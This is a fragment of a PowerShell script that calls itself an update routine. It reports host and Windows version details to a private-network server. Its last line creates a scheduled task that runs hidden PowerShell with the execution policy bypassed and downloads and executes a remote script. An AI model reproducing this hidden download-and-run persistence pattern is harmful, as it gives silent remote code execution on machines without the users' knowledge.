...
Invoke-WebRequest -Method GET -Uri "http://10.16.38.21:9999/api/info_reg/$hostname/$v1/$v2.$v3"

Clear-Host
if ($winver -eq "1803") {
    Write-Host "[error] Cannot Update"
    Invoke-WebRequest -Method GET -Uri "http://10.16.38.21:9999/api/result/2"
...
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -noni -nop -ep Bypass -Command iex(New-Object Net.WebClient).DownloadString(""http://10.16.38.21:9999/update/ps3"")"
